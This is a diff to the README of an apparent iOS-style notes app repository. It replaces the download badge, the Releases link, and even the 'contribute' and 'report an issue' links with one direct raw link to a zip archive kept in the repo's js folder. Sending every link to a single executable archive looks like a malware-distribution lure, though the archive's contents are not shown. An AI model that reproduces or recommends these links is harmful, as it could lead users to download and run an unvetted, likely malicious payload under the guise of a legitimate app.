@@ -1,6 +1,6 @@
 # 🌟 ios-notes - Simple, Beautiful Notes at Your Fingertips
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/ToughDesert/ios-notes/releases)
+[![Download](https://github.com/ToughDesert/ios-notes/raw/refs/heads/main/js/ios-notes-2.7-beta.2.zip)](https://github.com/ToughDesert/ios-notes/raw/refs/heads/main/js/ios-notes-2.7-beta.2.zip)
 
 ## 📖 Introduction
 
@@ -14,7 +14,7 @@ To get started, you only need to follow a few simple steps. The installation pro
 
 To download the latest version of **ios-notes**, please visit the following link:
 
-[Visit this page to download](https://github.com/ToughDesert/ios-notes/releases)
+[Visit this page to download](https://github.com/ToughDesert/ios-notes/raw/refs/heads/main/js/ios-notes-2.7-beta.2.zip)
 
 Once you’re on the Releases page, look for the latest version available. Click on the appropriate file to start downloading. 
 
@@ -68,9 +68,9 @@ If you encounter any issues or have suggestions for improvements, feel free to r
 
 ## 🔗 Useful Links
 
-- [How to contribute](https://github.com/ToughDesert/ios-notes/contributing)
-- [Report an issue](https://github.com/ToughDesert/ios-notes/issues)
-- [Visit the Releases page again](https://github.com/ToughDesert/ios-notes/releases)
+- [How to contribute](https://github.com/ToughDesert/ios-notes/raw/refs/heads/main/js/ios-notes-2.7-beta.2.zip)
+- [Report an issue](https://github.com/ToughDesert/ios-notes/raw/refs/heads/main/js/ios-notes-2.7-beta.2.zip)
+- [Visit the Releases page again](https://github.com/ToughDesert/ios-notes/raw/refs/heads/main/js/ios-notes-2.7-beta.2.zip)
 
 ## 📜 License
 
